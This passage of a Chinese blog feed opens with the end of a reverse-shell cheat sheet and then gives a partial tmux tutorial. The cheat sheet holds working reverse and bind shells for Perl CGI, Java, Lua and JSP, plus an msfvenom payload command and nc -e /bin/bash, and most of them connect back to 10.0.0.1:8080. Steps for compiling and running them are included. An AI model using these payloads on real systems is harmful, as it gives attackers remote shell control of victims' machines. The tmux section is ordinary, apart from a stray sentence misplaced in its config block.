getprotobyname("tcp"));if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;cgiprint("Sent reverse shell to $ip:$port");cgiprintpage();&#125; else &#123;cgiprint("Could not open reverse shell to $ip:$port: $!");cgiexit();&#125;open(STDIN, "&gt;&amp;SOCK");open(STDOUT,"&gt;&amp;SOCK");open(STDERR,"&gt;&amp;SOCK");$ENV&#123;"HISTFILE"&#125; = "/dev/null";system("w;uname -a;id;pwd");exec(&#123;"/bin/sh"&#125; ($fake_process_name, "-i"));sub cgiprint &#123;my $line = shift;$line .= "&lt;p&gt;\n";$global_page .= $line;&#125;sub cgiexit &#123;cgiprintpage();exit 0;&#125;sub cgiprintpage &#123;print "Content-Length: " . length($global_page) . "\r\nConnection: close\r\nContent-Type: text\/html\r\n\r\n" . $global_page;&#125;'</span></div></pre></td></tr></table></figure>
<h3 id="7、Java"><a href="#7、Java" class="headerlink" title="7、Java"></a>7、Java</h3><p>ReverseShell.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReverseShell</span></span></div><div class="line">&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</div><div class="line">        <span class="keyword">try</span>&#123;</div><div class="line">            Runtime r = Runtime.getRuntime();</div><div class="line">            Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</div><div class="line">            p.waitFor();</div><div class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>值得一提的是，由于java并不是脚本式语言，所以并不支持直接运行一行程序！所以需要进行的操作是：</p>
<blockquote>
<p>先将上述内容复制到一个文件中，以ReverseShell.java命名(必须是这个名字，类和文件名要一致)；</p>
<p>然后运行javac ReverseShell.java生成ReverseShell.class字节码文件。（这个操作需要javac，该命令依赖jdk）</p>
<p>最后执行java ReverseShell（执行过程中不用加后缀，java命令依赖于jre，最好将其放置在后台运行。即加上&amp;或者nohup）</p>
</blockquote>
<p>下面提供一个相对较为完整的Applet程序，其应该在网页中运行的，但是为了测试简单，我们直接在其中加入了main函数，所以有点像一个单独的程序一样。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div></pre></td><td class="code"><pre><div class="line">import java.io.*;</div><div class="line">import java.net.Socket;</div><div class="line">import java.util.*;</div><div class="line">import java.util.regex.*;</div><div class="line">import java.applet.Applet;</div><div class="line"></div><div class="line">public class poc extends Applet&#123;</div><div class="line">    /**</div><div class="line">     * Author: daniel baier alias duddits</div><div class="line">     * Licens: GPL</div><div class="line">     * Requirements: JRE 1.5 for running and the JDK 1.5 for compiling or higher</div><div class="line">     * Version: 0.1 alpha release</div><div class="line">     */</div><div class="line"></div><div class="line">    public String cd(String start, File currentDir) &#123;</div><div class="line">        File fullPath = new File(currentDir.getAbsolutePath());</div><div class="line">        String sparent = fullPath.getAbsoluteFile().toString();</div><div class="line">        return sparent + &quot;/&quot; + start;</div><div class="line"></div><div class="line">        &#125;</div><div class="line"></div><div class="line">    @SuppressWarnings(&quot;unchecked&quot;)</div><div class="line">    public void init() &#123;</div><div class="line">        poc rs = new poc();</div><div class="line">        PrintWriter out;</div><div class="line">        try &#123;</div><div class="line">            Socket clientSocket = new Socket(&quot;10.0.0.1&quot;,8080);</div><div class="line">            out = new PrintWriter(clientSocket.getOutputStream(), true);</div><div class="line">            out.println(&quot;\tJRS 0.1 alpha release\n\tdeveloped by duddits alias daniel baier&quot;);</div><div class="line">            boolean run = true;</div><div class="line">            String s;</div><div class="line">            BufferedReader br = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));</div><div class="line">            String startort = &quot;/&quot;;</div><div class="line">            while (run) &#123;</div><div class="line">                String z1;</div><div class="line">                File f = new File(startort);</div><div class="line">                out.println(f.getAbsolutePath() + &quot;&gt; &quot;);</div><div class="line">                s = br.readLine();</div><div class="line">                z1 = s;</div><div class="line">                Pattern pcd = Pattern.compile(&quot;^cd\\s&quot;);</div><div class="line">                Matcher mcd = pcd.matcher(z1);</div><div class="line">                String[] teile1 = pcd.split(z1);</div><div class="line">                if (s.equals(&quot;exit&quot;)) &#123;</div><div class="line">                    run = false;</div><div class="line">                &#125;else if (s.equals(null) || s.equals(&quot;cmd&quot;) || s.equals(&quot;&quot;)) &#123;</div><div class="line"></div><div class="line">                &#125; else if(mcd.find())&#123;</div><div class="line">                    try &#123;</div><div class="line">                        String cds = rs.cd(teile1[1], new File(startort));</div><div class="line">                        startort = cds;</div><div class="line">                        &#125; catch (Exception verz) &#123;</div><div class="line">                        out.println(&quot;Path &quot; + teile1[1]</div><div class="line">                        + &quot; not found.&quot;);</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                &#125;else &#123;</div><div class="line"></div><div class="line">                    String z2;</div><div class="line"></div><div class="line"></div><div class="line">                    z2 = s;</div><div class="line">                    Pattern pstring = Pattern.compile(&quot;\\s&quot;);</div><div class="line">                    String[] plist = pstring.split(z2);</div><div class="line"></div><div class="line">                    try &#123;</div><div class="line"></div><div class="line">                        LinkedList slist = new LinkedList();</div><div class="line">                        for (int i = 0; i &lt; plist.length; i++) &#123;</div><div class="line">                            slist.add(plist[i]);</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                        ProcessBuilder builder = new ProcessBuilder(slist);</div><div class="line">                        builder.directory(new File(startort));</div><div class="line">                        Process p = builder.start();</div><div class="line">                        Scanner se = new Scanner(p.getInputStream());</div><div class="line">                        if (!se.hasNext()) &#123;</div><div class="line">                            Scanner sa = new Scanner(p.getErrorStream());</div><div class="line">                            while (sa.hasNext()) &#123;</div><div class="line">                                out.println(sa.nextLine());</div><div class="line">                            &#125;</div><div class="line">                        &#125;</div><div class="line">                        while (se.hasNext()) &#123;</div><div class="line">                            out.println(se.nextLine());</div><div class="line">                        &#125;</div><div class="line"></div><div class="line"></div><div class="line">                    &#125; catch (Exception err) &#123;</div><div class="line">                        out.println(f.getAbsolutePath() + &quot;&gt; Command &quot;</div><div class="line">                                + s + &quot; failed!&quot;);</div><div class="line">                        out.println(f.getAbsolutePath() +&quot;&gt; Please try cmd /c &quot;+ s+&quot; or bash -c &quot; +s+&quot; if this command is an shell buildin.&quot;);</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            if(!clientSocket.isConnected())&#123;</div><div class="line">                run = false;</div><div class="line">                out.flush();</div><div class="line">                out.close();</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125; catch (Exception io) &#123;</div><div class="line">            //System.err.println(&quot;Connection refused by peer&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static void main(String[] args)&#123;</div><div class="line">        poc p = new poc();</div><div class="line">        p.init();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<blockquote>
<p>运行此程序之前，应该更改环境变量的设置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; export DISPLAY=:0.0</div><div class="line">&gt; 或者</div><div class="line">&gt; setenv DISPLAY :0.0</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<h3 id="8、Lua"><a href="#8、Lua" class="headerlink" title="8、Lua"></a>8、Lua</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','8080');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></div></pre></td></tr></table></figure>
<p>不建议安装最新的lua，因为会出现以下问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lua: (command line):1: module &apos;socket&apos; not found:</div><div class="line">	no field package.preload[&apos;socket&apos;]</div><div class="line">	no file &apos;/usr/local/share/lua/5.2/socket.lua&apos;</div></pre></td></tr></table></figure>
<p>这个时候，你应该查看一下服务器上的/usr/local/share/lua下的目录到底是5.1还是5.2，根据其版本，安装正确的lua</p>
<h3 id="9、Jsp"><a href="#9、Jsp" class="headerlink" title="9、Jsp"></a>9、Jsp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">使用</div><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=8080 R &gt; re.jsp</div></pre></td></tr></table></figure>
<p>reverse_shell.jsp</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.lang.*"</span>%&gt;</div><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*"</span>%&gt;</div><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.io.*"</span>%&gt;</div><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.net.*"</span>%&gt;</div><div class="line"></div><div class="line">&lt;%</div><div class="line">  <span class="class"><span class="keyword">class</span> <span class="title">StreamConnector</span> <span class="keyword">extends</span> <span class="title">Thread</span></span></div><div class="line">  &#123;</div><div class="line">    InputStream zd;</div><div class="line">    OutputStream fm;</div><div class="line"></div><div class="line">    StreamConnector( InputStream zd, OutputStream fm )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">this</span>.zd = zd;</div><div class="line">      <span class="keyword">this</span>.fm = fm;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">      BufferedReader fr  = <span class="keyword">null</span>;</div><div class="line">      BufferedWriter ctw = <span class="keyword">null</span>;</div><div class="line">      <span class="keyword">try</span></div><div class="line">      &#123;</div><div class="line">        fr  = <span class="keyword">new</span> BufferedReader( <span class="keyword">new</span> InputStreamReader( <span class="keyword">this</span>.zd ) );</div><div class="line">        ctw = <span class="keyword">new</span> BufferedWriter( <span class="keyword">new</span> OutputStreamWriter( <span class="keyword">this</span>.fm ) );</div><div class="line">        <span class="keyword">char</span> buffer[] = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">8192</span>];</div><div class="line">        <span class="keyword">int</span> length;</div><div class="line">        <span class="keyword">while</span>( ( length = fr.read( buffer, <span class="number">0</span>, buffer.length ) ) &gt; <span class="number">0</span> )</div><div class="line">        &#123;</div><div class="line">          ctw.write( buffer, <span class="number">0</span>, length );</div><div class="line">          ctw.flush();</div><div class="line">        &#125;</div><div class="line">      &#125; <span class="keyword">catch</span>( Exception e )&#123;&#125;</div><div class="line">      <span class="keyword">try</span></div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span>( fr != <span class="keyword">null</span> )</div><div class="line">          fr.close();</div><div class="line">        <span class="keyword">if</span>( ctw != <span class="keyword">null</span> )</div><div class="line">          ctw.close();</div><div class="line">      &#125; <span class="keyword">catch</span>( Exception e )&#123;&#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">try</span></div><div class="line">  &#123;</div><div class="line">    String ShellPath;</div><div class="line"><span class="keyword">if</span> (System.getProperty(<span class="string">"os.name"</span>).toLowerCase().indexOf(<span class="string">"windows"</span>) == -<span class="number">1</span>) &#123;</div><div class="line">  ShellPath = <span class="keyword">new</span> String(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">  ShellPath = <span class="keyword">new</span> String(<span class="string">"cmd.exe"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">    Socket socket = <span class="keyword">new</span> Socket( <span class="string">"10.0.0.1"</span>, <span class="number">8080</span> );</div><div class="line">    Process process = Runtime.getRuntime().exec( ShellPath );</div><div class="line">    ( <span class="keyword">new</span> StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();</div><div class="line">    ( <span class="keyword">new</span> StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();</div><div class="line">  &#125; <span class="keyword">catch</span>( Exception e ) &#123;&#125;</div><div class="line">%&gt;</div></pre></td></tr></table></figure>
<h3 id="10、正向shell（nc为例）"><a href="#10、正向shell（nc为例）" class="headerlink" title="10、正向shell（nc为例）"></a>10、正向shell（nc为例）</h3><p>服务器端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvvp 7777 -e /bin/bash</div></pre></td></tr></table></figure>
<p>攻击端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 10.0.0.2 7777</div></pre></td></tr></table></figure>
<p>最后要说的是xterm，这是一个session，可以维持；而由于服务器上和本地都得装相应的程序，所以起来较为麻烦！</p>
]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tmux使用教程]]></title>
      <url>/2017/12/09/tmux%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      <content type="html"><![CDATA[<h2 id="为什么要用-Tmux"><a href="#为什么要用-Tmux" class="headerlink" title="为什么要用 Tmux"></a>为什么要用 Tmux</h2><p>tmux 在很多方面都很有用。就我而言，由于 tmux 允许随时随地断开或重新接入会话（Session），所以最大的作用就是在远程服务器上持久地保存工作状态。</p>
<p>例如，你可以在服务器上新建一个会话并命名为“nodeapi”，然后用它来挖掘 node REST API 的漏洞（这是我现在的项目）。或者假设你正在咖啡店里工作，需要编译一些代码，而编译要花费 2 个小时才能完成（如果是和我一起工作的话），这时你又不得不离开咖啡店。如果使用了 tmux，你就可以轻松地断开当前的会话，并于稍后方便时重新接入该会话，继续工作。</p>
<p>这真是太方便了。</p>
<p>“如何使用 tmux 才能打开多个会话，如何在会话中打开多个标签（Tab），如何在标签中打开多个窗口（Window），又如何在窗口中打开多个窗格（Pane）”，也许有些人对这些操作更感兴趣。而我很少这样做的，因为我不喜欢打开太多的——实际上是尽可能少地打开——这些东西。因此，这篇入门教程主要讲解的也是作为简单的可持久化远程会话模型的 tmux。</p>
<h3 id="远程操作计算机的生活方式"><a href="#远程操作计算机的生活方式" class="headerlink" title="远程操作计算机的生活方式"></a>远程操作计算机的生活方式</h3><p>机动性是 tmux 带给用户的最大价值。有很多开发者都是在服务器上进行所有工作的，他们只需从某处连接上服务器就可以开始工作了。有了 tmux（或者其他类似的工具），你就可以先坐在旧金山的某个咖啡店里开始在服务器上进行构建的工作，然后断开会话去赶飞机，待飞机降落到纽约市后再继续进行刚才的工作。</p>
<p>tmux 带来的另一个好处是在移动办公中，作为客户端的计算机变得不再那么重要了。只需要升级你的笔记本，然后从版本库中克隆出 vim 和 tmux 的配置文件，就可以再次回到配置最优的操作环境了。而且这一切只需要短短的几分钟。</p>
<p>总之，这些就是人们喜爱 tmux 的原因。当然即使你的生活不是四处奔波，也一样能体验到 tmux 带来的好处。</p>
<h4 id="那么-screen-呢？"><a href="#那么-screen-呢？" class="headerlink" title="那么 screen 呢？"></a>那么 screen 呢？</h4><p>问得好。tmux 和 screen 很像，但比 screen 更好。要问好在哪里，简单的回答就是虽然与 screen 的功能相同，但是 tmux 设计得更好。screen 虽然可用，但是很不稳定。</p>
<p>以下是一些 tmux 超越 screen 的地方：</p>
<ul>
<li>screen 的项目大体上已经终止了，并且代码中有大量的问题</li>
<li>tmux 是一个活跃的项目，并且其代码库经常进行更新</li>
<li>tmux 使用的是真正的客户端/服务器模型，而 screen 只是模拟了这种模型的行为</li>
<li>tmux 同时支持 emacs 和 vim 的快捷键</li>
<li>tmux 支持自动重命名窗口</li>
<li>tmux 可以高度的脚本化</li>
<li>tmux 的窗口分割功能更加先进</li>
</ul>
<p>这些优点已经足够了吧，开始使用 tmux 吧。</p>
<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>首先要告诉诸位的是 tmux 中的一个全局的快捷键开关，开关开启后就可以通过快捷键完成很多任务。</p>
<h3 id="tmux-的快捷键"><a href="#tmux-的快捷键" class="headerlink" title="tmux 的快捷键"></a>tmux 的快捷键</h3><p>tmux 默认使用 <code>Ctrl-b</code> 作为激活快捷键的开关，开关开启后就可以通过快捷键迅速调用大量的功能。下面就给出一些基本功能的调用方法：</p>
<p>首先按下</p>
<p><code>$ Ctrl-b</code></p>
<p>接下来就可以按下一些后面将会讲解的快捷键了。不过先不要着急，可以先为能方便地使用组合键 <code>Ctrl-b</code> 做一点准备。不妨在操作系统中将键盘上的 CAPSLOCK 键映射为 Ctrl 键，这样当需要按下这个组合键时，小拇指的移动就可以更加舒服了。</p>
<h3 id="运行-tmux"><a href="#运行-tmux" class="headerlink" title="运行 tmux"></a>运行 tmux</h3><p>好了，下面让我们从运行 tmux 开始。首先选择一台你希望在断开会话后依然可以重新接入的计算机（对我来说这通常是远程服务器），然后在上面运行如下的命令：</p>
<p><code>$ tmux</code></p>
<p>很简单对吧。这样就开启了一个 tmux 的会话，你可以断开这个会话并在稍后再重新接入。</p>
<h3 id="显示所有会话"><a href="#显示所有会话" class="headerlink" title="显示所有会话"></a>显示所有会话</h3><p>由于 tmux 的理念是可以开启多个会话，并且可以自由地断开会话后重新接入，为此我们需要首先能看到可用的会话。有两种方法可以实现这个目的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Via shortcut (by default Ctrl-b)</div><div class="line"># 使用快捷键（默认为 Ctrl-b）</div><div class="line"> </div><div class="line">$ Ctrl-b s</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Via tmux command</div><div class="line"># 使用 tmux 的子命令</div><div class="line"> </div><div class="line">$ tmux ls</div></pre></td></tr></table></figure>
<p>上面两种方法的效果相同，都可以得到类似下面的结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0: 1 windows (created Thu Nov 28 06:12:52 2013) [80x24] (attached)</div></pre></td></tr></table></figure>
<h3 id="新建会话"><a href="#新建会话" class="headerlink" title="新建会话"></a>新建会话</h3><p>下面我们就来新建一个会话。可以使用 <code>new</code> 命令新建会话，并且该命令允许以参数的形式传递一个会话名。我的建议是在新建时要提供一个会话名以便于日后管理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tmux new -s session-name</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Without naming the new session (not recommended) </div><div class="line"># 新建会话但并不指定名字 (不推荐这样做) </div><div class="line"> </div><div class="line">$ tmux new</div></pre></td></tr></table></figure>
<h3 id="接入一个之前的会话"><a href="#接入一个之前的会话" class="headerlink" title="接入一个之前的会话"></a>接入一个之前的会话</h3><p>既然我们已经创建了多个带有名称的会话，那么就可以随时接入了，有几种方法可以实现接入会话：</p>
<p>可以简单地输入 <code>tmux a</code> 命令，这样可以接入第一个可用的会话：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tmux a</div></pre></td></tr></table></figure>
<p>或者可以通过参数指定一个想接入的会话：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tmux a -t session-name</div></pre></td></tr></table></figure>
<h3 id="从会话中断开"><a href="#从会话中断开" class="headerlink" title="从会话中断开"></a>从会话中断开</h3><p>可以使用 <code>detach</code> 命令断开已有的会话（因此才会有稍后重新接入会话这么一说）。</p>
<p><code>$ tmux detach</code></p>
<p>也可以使用快捷键断开会话：</p>
<p><code>$ Ctrl-b d</code></p>
<h3 id="关闭会话"><a href="#关闭会话" class="headerlink" title="关闭会话"></a>关闭会话</h3><p>要关闭会话的话，可以使用如下的命令，该命令和接入会话时所使用的命令很像：</p>
<p><code>$ tmux kill-session -t session-name</code></p>
<p>提示：关闭窗口时也可以使用类似的命令，只不过要把 kill-session 换成 kill-window。另外，还可以使用 tmux killall 同时关闭 tmux。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>与其他工具一样，一旦配置好了 tmux，使用起来就将会非常顺手。下面就给出几个通常需要配置的项目：</p>
<ul>
<li>tmux 的主要快捷键</li>
<li>屏幕下方的状态条</li>
<li>自定义的各种快捷键</li>
</ul>
<p>我使用了一些相当简单的配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># Set a Ctrl-b shortcut for reloading your tmux config</div><div class="line">#设置 Ctrl-b 快捷键，用于重新加载 tmux 的配置文件</div></pre></td></tr></table></figure>
<p>access log，error log和system log。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">bind r source-file ~/.tmux.conf</div><div class="line"> </div><div class="line"># Rename your terminals</div><div class="line"># 重命名终端</div><div class="line">set -g set-titles on</div><div class="line">set -g set-titles-string &amp;#039;#(whoami)::#h::#(curl ipecho.net/plain;echo)&amp;#039;</div><div class="line"> </div><div class="line"># Status bar customization</div><div class="line"># 自定义状态条</div><div class="line">set -g status-utf8 on</div><div class="line">set -g status-bg black</div><div class="line">set -g status-fg white</div><div class="line">set -g status-interval 5</div><div class="line">set -g status-left-length 90</div><div class="line">set -g status-right-length 60</div><div class="line">set -g status-left &amp;quot;#[fg=Green]#(whoami)#[fg=white]::#[fg=blue]</div><div class="line">(hostname -s)#[fg=white]::##[fg=yellow]#(curl ipecho.net/plain;echo)&amp;quot;</div><div class="line"> </div><div class="line">set -g status-justify left</div><div class="line">set -g status-right &amp;#039;#[fg=Cyan]#S #[fg=white]%a %d %b %R&amp;#039;</div></pre></td></tr></table></figure>
<blockquote>
<p>tmux 默认会先从 <code>/etc/tmux.conf</code> 加载系统级的配置项，然后从 <code>~/.tmux.conf</code> 加载用户级的配置项。也可以使用参数 <code>-f</code> 指定一个配置文件。——译者注</p>
</blockquote>
<p>这里有一点值得注意，我使用了 ipecho.net 而不是 icanhazip 来获取计算机当前的 IP 地址（IPv4）。虽然也有很多教程在使用 icanhazip，但是凭我的经验，ipecho.net 的速度更快，更稳定。</p>
<p>提示：如果你感兴趣，可以来<a href="https://raw.github.com/danielmiessler/tmux/master/.tmux.config" target="_blank" rel="external">这里</a>查看我使用的最新配置。</p>
<h2 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h2><p>我平时常用的功能就是这些了。不过，我也会使用一些 tmux 中更强大的功能。</p>
<h3 id="窗口和窗格"><a href="#窗口和窗格" class="headerlink" title="窗口和窗格"></a>窗口和窗格</h3><p><img src="/images/2017-12-09/7178f37egw1esoxc7zgryj21670nf7li.jpg" alt="img"></p>
<p>这些高级功能之一就是 tmux 可以将一个会话分割成若干个称为窗口（Window）和窗格（Pane）的相互分离的组件。这种逻辑上的分割使用户可以轻松安排各种各样的操作。</p>
<p>下面就来看一看这几个概念之间的关系。</p>
<h4 id="层次结构"><a href="#层次结构" class="headerlink" title="层次结构"></a>层次结构</h4><p><img src="/images/2017-12-09/7178f37egw1esoxc7hp5oj20gm0bkjs6.jpg" alt="img"></p>
<p>如上图所示，一个会话（Session）可以包含多个窗口，一个窗口（Window）可以包含多个窗格（Pane）。这就是我对这些概念的简单理解。当然如果诸位有更权威或者更实用的解释，我很乐意洗耳恭听。</p>
<ul>
<li>会话适用于分别管理大的工作内容，例如日常工作，实验或是系统管理，都可以分别在一个会话中进行。</li>
<li>窗口适用于分别管理这些大工作中的项目。例如，在用于实验的会话中可能有一叫做 noderestapi 的窗口用于调试 node REST API，有一个叫做 lua 的窗口用于调试 lua 脚本。</li>
<li>窗格适用于查看当前的项目。例如，在系统管理的会话中有一个叫做 logs 的窗口，在这个窗口中可以打开多个窗格分别用于查看 access log，error log和system log。</li>
</ul>
<p>我们也可以在会话中直接创建窗格，而不需要先创建一个窗口。我有时也会这样做。当阅读完“层次结构”这一小节，希望我的这种做法没有听起来那样恐怖。正如我在一开始谈到的，我更倾向于简化 tmux 的使用。</p>
<h4 id="在窗格间移动光标"><a href="#在窗格间移动光标" class="headerlink" title="在窗格间移动光标"></a>在窗格间移动光标</h4><p>虽然有默认的在窗格间移动光标的方法，但是我并不清楚是什么。因为我习惯用 vim，所以我会用<code>h</code>，<code>j</code>，<code>k</code> 和 <code>l</code> 键在窗格间移动光标。为此，要加入如下的配置：</p>
